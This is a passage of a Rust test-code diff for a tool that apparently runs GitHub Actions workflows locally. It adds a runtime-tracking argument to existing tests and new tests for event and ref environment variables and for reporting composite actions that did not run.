+        assert_eq!(before.matches("RUN ").count(), 1);
     }
 
     #[test]
@@ -9881,7 +11093,7 @@ runs:
             version: "1.0".to_string(),
             install_script: String::new(),
         }];
-        let df = generate_combined_dockerfile(&runtimes, "ubuntu:latest");
+        let df = generate_combined_dockerfile(&runtimes, "ubuntu:latest", None);
         // Single RUN layer with just the base packages
         assert_eq!(df.matches("RUN ").count(), 1);
     }
@@ -9988,6 +11200,7 @@ runs:
             runtime: &runtime,
             workflow: &workflow,
             runner_image: "ubuntu:latest",
+            installed_runtimes: &BuiltRuntimes::default(),
             verbose: false,
             matrix_combination: &None,
             container_config: None,
@@ -10036,6 +11249,7 @@ runs:
             runtime: &runtime,
             workflow: &workflow,
             runner_image: "ubuntu:latest",
+            installed_runtimes: &BuiltRuntimes::default(),
             verbose: false,
             matrix_combination: &None,
             container_config: None,
@@ -10276,6 +11490,7 @@ runs:
             runtime: &runtime,
             workflow: &workflow,
             runner_image: "ubuntu:latest",
+            installed_runtimes: &BuiltRuntimes::default(),
             verbose: false,
             matrix_combination: &None,
             container_config: None,
@@ -10349,6 +11564,7 @@ runs:
             runtime: &runtime,
             workflow: &workflow,
             runner_image: "ubuntu:latest",
+            installed_runtimes: &BuiltRuntimes::default(),
             verbose: false,
             matrix_combination: &None,
             container_config: None,
@@ -10390,6 +11606,7 @@ runs:
             runtime: &runtime,
             workflow: &workflow,
             runner_image: "ubuntu:latest",
+            installed_runtimes: &BuiltRuntimes::default(),
             verbose: false,
             matrix_combination: &None,
             container_config: None,
@@ -10433,6 +11650,7 @@ runs:
             runtime: &runtime,
             workflow: &workflow,
             runner_image: "ubuntu:latest",
+            installed_runtimes: &BuiltRuntimes::default(),
             verbose: false,
             matrix_combination: &None,
             container_config: None,
@@ -10480,6 +11698,7 @@ runs:
             runtime: &runtime,
             workflow: &workflow,
             runner_image: "ubuntu:latest",
+            installed_runtimes: &BuiltRuntimes::default(),
             verbose: false,
             matrix_combination: &None,
             container_config: None,
@@ -10516,6 +11735,7 @@ runs:
             runtime: &runtime,
             workflow: &workflow,
             runner_image: "ubuntu:latest",
+            installed_runtimes: &BuiltRuntimes::default(),
             verbose: false,
             matrix_combination: &None,
             container_config: None,
@@ -10615,6 +11835,61 @@ runs:
     }
 
     #[test]
+    fn the_run_ref_sets_the_event_and_branches_steps_see() {
+        let workflow = minimal_workflow();
+        let workspace = Path::new("/host/workspace");
+
+        let push = environment::RunRef {
+            event_name: Some("push"),
+            git_ref: Some("refs/heads/release/2.0"),
+            base_branch: Some("main"),
+        };
+        let (env, _) = github_run_env(&workflow, workspace, &RuntimeType::Docker, &push).unwrap();
+        assert_eq!(env["GITHUB_EVENT_NAME"], "push");
+        assert_eq!(env["GITHUB_REF"], "refs/heads/release/2.0");
+        assert_eq!(env["GITHUB_REF_NAME"], "release/2.0");
+        assert_eq!(env["GITHUB_HEAD_REF"], "");
+        assert_eq!(env["GITHUB_BASE_REF"], "");
+
+        let pull_request = environment::RunRef {
+            event_name: Some("pull_request"),
+            git_ref: Some("refs/heads/feat"),
+            base_branch: Some("main"),
+        };
+        let (env, _) =
+            github_run_env(&workflow, workspace, &RuntimeType::Docker, &pull_request).unwrap();
+        assert_eq!(env["GITHUB_EVENT_NAME"], "pull_request");
+        assert_eq!(env["GITHUB_HEAD_REF"], "feat");
+        assert_eq!(env["GITHUB_BASE_REF"], "main");
+
+        // A tag push is a tag, not a branch of the same name.
+        let tag = environment::RunRef {
+            event_name: Some("push"),
+            git_ref: Some("refs/tags/v1.2.3"),
+            base_branch: None,
+        };
+        let (env, _) = github_run_env(&workflow, workspace, &RuntimeType::Docker, &tag).unwrap();
+        assert_eq!(env["GITHUB_REF"], "refs/tags/v1.2.3");
+        assert_eq!(env["GITHUB_REF_NAME"], "v1.2.3");
+        assert_eq!(env["GITHUB_REF_TYPE"], "tag");
+
+        // Without --event, a workflow whose first trigger is a pull request
+        // still gets the pull request's branches.
+        let mut pr_first = minimal_workflow();
+        pr_first.on = vec!["pull_request".to_string()];
+        let implicit = environment::RunRef {
+            event_name: None,
+            git_ref: Some("refs/heads/feat"),
+            base_branch: Some("main"),
+        };
+        let (env, _) =
+            github_run_env(&pr_first, workspace, &RuntimeType::Docker, &implicit).unwrap();
+        assert_eq!(env["GITHUB_EVENT_NAME"], "pull_request");
+        assert_eq!(env["GITHUB_HEAD_REF"], "feat");
+        assert_eq!(env["GITHUB_BASE_REF"], "main");
+    }
+
+    #[test]
     fn workflow_env_expressions_see_what_steps_see() {
         let mut workflow = minimal_workflow();
         for (key, value) in [
@@ -10625,12 +11900,24 @@ runs:
         }
         let workspace = Path::new("/host/workspace");
 
-        let (env, user_env) = github_run_env(&workflow, workspace, &RuntimeType::Docker).unwrap();
+        let (env, user_env) = github_run_env(
+            &workflow,
+            workspace,
+            &RuntimeType::Docker,
+            &Default::default(),
+        )
+        .unwrap();
         assert_eq!(env["BUILD_DIR"], "/github/workspace/build");
         assert_eq!(env["TARGET_OS"], "Linux");
         assert_eq!(user_env["BUILD_DIR"], "/github/workspace/build");
 
-        let (env, _) = github_run_env(&workflow, workspace, &RuntimeType::Emulation).unwrap();
+        let (env, _) = github_run_env(
+            &workflow,
+            workspace,
+            &RuntimeType::Emulation,
+            &Default::default(),
+        )
+        .unwrap();
         assert_eq!(
             env["BUILD_DIR"],
             format!("{}/build", env["GITHUB_WORKSPACE"])
@@ -10706,6 +11993,7 @@ runs:
             runtime,
             workflow: &workflow,
             runner_image: "ubuntu:latest",
+            installed_runtimes: &BuiltRuntimes::default(),
             verbose: false,
             matrix_combination: &None,
             container_config: None,
@@ -10942,6 +12230,7 @@ runs:
             runtime: &runtime,
             workflow: &workflow,
             runner_image: "ubuntu:latest",
+            installed_runtimes: &BuiltRuntimes::default(),
             verbose: false,
             matrix_combination: &None,
             container_config: None,
@@ -10991,6 +12280,7 @@ runs:
             runtime: &runtime,
             workflow: &workflow,
             runner_image: "ubuntu:latest",
+            installed_runtimes: &BuiltRuntimes::default(),
             verbose: false,
             matrix_combination: &None,
             container_config: None,
@@ -11038,6 +12328,7 @@ runs:
             runtime: &runtime,
             workflow: &workflow,
             runner_image: "ubuntu:latest",
+            installed_runtimes: &BuiltRuntimes::default(),
             verbose: false,
             matrix_combination: &None,
             container_config: None,
@@ -11085,6 +12376,7 @@ runs:
             runtime: &runtime,
             workflow: &workflow,
             runner_image: "ubuntu:latest",
+            installed_runtimes: &BuiltRuntimes::default(),
             verbose: false,
             matrix_combination: &None,
             container_config: None,
@@ -11130,6 +12422,7 @@ runs:
                 runtime: &runtime,
                 workflow: &workflow,
                 runner_image: "ubuntu:latest",
+                installed_runtimes: &BuiltRuntimes::default(),
                 verbose: false,
                 matrix_combination: &None,
                 container_config: None,
@@ -11261,6 +12554,7 @@ runs:
             outcome: StepStatus::Failure,
             conclusion: StepStatus::Success, // continue-on-error
             exit_code: None,
+            actions_not_run: Vec::new(),
         };
         record_step_status(Some("build"), &result, &mut map, &mut status);
 
@@ -11493,6 +12787,81 @@ runs:
         assert_eq!(input_env_key("name"), "INPUT_NAME");
     }
 
+    /// An action inside a composite action that didn't run is reported on
+    /// the step that called it, and a setup action inside one ran when the
+    /// job built its runtime into the image.
+    #[tokio::test]
+    async fn a_composite_action_reports_the_actions_inside_it_that_did_not_run() {
+        let node_action = "name: x\nruns:\n  using: node20\n  main: index.js\n";
+        for uses in ["wrkflw-test/composite-inner", "actions/setup-node"] {
+            action_resolver::seed_cache_for_test(uses, "main", node_action).await;
+        }
+        let action_dir = tempfile::tempdir().unwrap();
+        fs::write(
+            action_dir.path().join("action.yml"),
+            r#"
+name: wraps others
+runs:
+  using: composite
+  steps:
+    - uses: actions/setup-node
+    - uses: wrkflw-test/composite-inner
+"#,
+        )
+        .unwrap();
+
+        let runtime = MockContainerRuntime::default();
+        let job_env = HashMap::from([(
+            "WRKFLW_RUNTIME_MODE".to_string(),
+            RuntimeType::Docker.mode_name().to_string(),
+        )]);
+        let working_dir = tempfile::tempdir().unwrap();
+        let step = make_run_step("noop");
+        let services = test_services();
+        let pending = std::sync::Mutex::new(Vec::<PendingCacheSave>::new());
+        let run = |installed: Vec<String>| {
+            let (step, job_env, runtime, services, pending, action_dir, working_dir) = (
+                &step,
+                &job_env,
+                &runtime,
+                &services,
+                &pending,
+                &action_dir,
+                &working_dir,
+            );
+            async move {
+                execute_composite_action(
+                    step,
+                    action_dir.path(),
+                    job_env,
+                    job_env,
+                    working_dir.path(),
+                    runtime,
+                    "ubuntu:latest",
+                    &BuiltRuntimes {
+                        installed,
+                        not_built: Vec::new(),
+                    },
+                    false,
+                    services,
+                    pending,
+                )
+                .await
+                .unwrap()
+            }
+        };
+
+        let with_node = run(vec!["node".to_string()]).await;
+        assert_eq!(with_node.status, StepStatus::Success);
+        assert_eq!(with_node.actions_not_run, ["wrkflw-test/composite-inner"]);
+
+        let without = run(Vec::new()).await;
+        assert_eq!(
+            without.actions_not_run,
+            ["actions/setup-node", "wrkflw-test/composite-inner"]
+        );
+    }
+
     #[tokio::test]
     async fn composite_inputs_get_hyphenated_names_and_scalar_defaults() {
         let action_dir = tempfile::tempdir().unwrap();
@@ -11533,6 +12902,7 @@ runs:
             working_dir.path(),
             &runtime,
             "ubuntu:latest",
+            &BuiltRuntimes::default(),
             false,
             &services,
             &pending,
@@ -11621,6 +12991,7 @@ runs:
             runtime: &runtime,
             workflow: &workflow,
             runner_image: "ubuntu:latest",
+            installed_runtimes: &BuiltRuntimes::default(),
             verbose: false,
             matrix_combination: &None,
             container_config: None,
@@ -11827,6 +13198,7 @@ runs:
             runtime: &runtime,
             workflow: &workflow,
             runner_image: "ubuntu:latest",
+            installed_runtimes: &BuiltRuntimes::default(),
             verbose: false,
             matrix_combination: &None,
             container_config: None,
@@ -11963,6 +13335,7 @@ runs:
             runtime: &runtime,
             workflow: &workflow,
             runner_image: "ubuntu:latest",
+            installed_runtimes: &BuiltRuntimes::default(),
             verbose: false,
             matrix_combination: &None,
             container_config: None,
@@ -12012,6 +13385,7 @@ runs:
             runtime: &runtime,
             workflow: &workflow,
             runner_image: "ubuntu:latest",
+            installed_runtimes: &BuiltRuntimes::default(),
             verbose: false,
             matrix_combination: &None,
             container_config: None,
@@ -12090,6 +13464,7 @@ runs:
             runtime: &runtime,
             workflow: &workflow,
             runner_image: "ubuntu:latest",
+            installed_runtimes: &BuiltRuntimes::default(),
             verbose: false,
             matrix_combination: &None,
             container_config: None,
@@ -12138,6 +13513,7 @@ runs:
             runtime: &runtime,
             workflow: &workflow,
             runner_image: "ubuntu:latest",
+            installed_runtimes: &BuiltRuntimes::default(),
             verbose: false,
             matrix_combination: &None,
             container_config: None,
@@ -12192,6 +13568,7 @@ runs:
             runtime: &runtime,
             workflow: &workflow,
             runner_image: "ubuntu:latest",
+            installed_runtimes: &BuiltRuntimes::default(),
             verbose: false,
             matrix_combination: &None,
             container_config: None,
@@ -12259,6 +13636,7 @@ runs:
             runtime: &runtime,
             workflow: &workflow,
             runner_image: "ubuntu:latest",
+            installed_runtimes: &BuiltRuntimes::default(),
             verbose: false,
             matrix_combination: &None,
             container_config: None,
@@ -12359,6 +13737,7 @@ runs:
             outcome: StepStatus::Failure,
             conclusion: StepStatus::Success,
             exit_code: None,
+            actions_not_run: Vec::new(),
         };
         record_step_status(Some("lint"), &result, &mut step_statuses, &mut job_status);
 
@@ -12469,6 +13848,7 @@ runs:
             runtime: &runtime,
             workflow: &workflow,
             runner_image: "ubuntu:latest",
+            installed_runtimes: &BuiltRuntimes::default(),
             verbose: false,
             matrix_combination: &None,
             container_config: None,
@@ -12542,6 +13922,7 @@ runs:
             runtime: &runtime,
             workflow: &workflow,
             runner_image: "ubuntu:latest",
+            installed_runtimes: &BuiltRuntimes::default(),
             verbose: false,
             matrix_combination: &None,
             container_config: None,
@@ -12600,6 +13981,7 @@ runs:
             runtime: &runtime,
             workflow: &workflow,
             runner_image: "ubuntu:latest",
+            installed_runtimes: &BuiltRuntimes::default(),
             verbose: false,
             matrix_combination: &None,
             container_config: None,
@@ -12655,6 +14037,7 @@ runs:
             runtime: &runtime,
             workflow: &workflow,
             runner_image: "ubuntu:latest",
+            installed_runtimes: &BuiltRuntimes::default(),
             verbose: false,
             matrix_combination: &None,
             container_config: None,
@@ -12716,6 +14099,7 @@ runs:
             runtime: &runtime,
             workflow: &workflow,
             runner_image: "ubuntu:latest",
+            installed_runtimes: &BuiltRuntimes::default(),
             verbose: false,
             matrix_combination: &None,
             container_config: None,
@@ -12863,6 +14247,7 @@ runs:
             runtime: &runtime,
             workflow: &workflow,
             runner_image: "ubuntu:latest",
+            installed_runtimes: &BuiltRuntimes::default(),
             verbose: false,
             matrix_combination: &None,
             container_config: None,
@@ -12945,6 +14330,7 @@ runs:
             working_dir.path(),
             &runtime,
             "ubuntu:latest",
+            &BuiltRuntimes::default(),
             false,
             &services,
             &pending,
@@ -12998,6 +14384,7 @@ runs:
             working_dir.path(),
             &runtime,
             "ubuntu:latest",
+            &BuiltRuntimes::default(),
             false,
             &services,
             &pending,
@@ -13061,6 +14448,7 @@ runs:
             working_dir.path(),
             &runtime,
             "ubuntu:latest",
+            &BuiltRuntimes::default(),
             false,
             &services,
             &pending,
@@ -13099,6 +14487,7 @@ runs:
             working_dir.path(),
             &runtime,
             "ubuntu:latest",
+            &BuiltRuntimes::default(),
             false,
             &services,
             &pending,
@@ -13139,6 +14528,7 @@ runs:
             working_dir.path(),
             &runtime,
             "ubuntu:latest",
+            &BuiltRuntimes::default(),
             false,
             &services,
             &pending,
@@ -13176,6 +14566,7 @@ runs:
             working_dir.path(),
             &runtime,
             "ubuntu:latest",
+            &BuiltRuntimes::default(),
             false,
             &services,
             &pending,
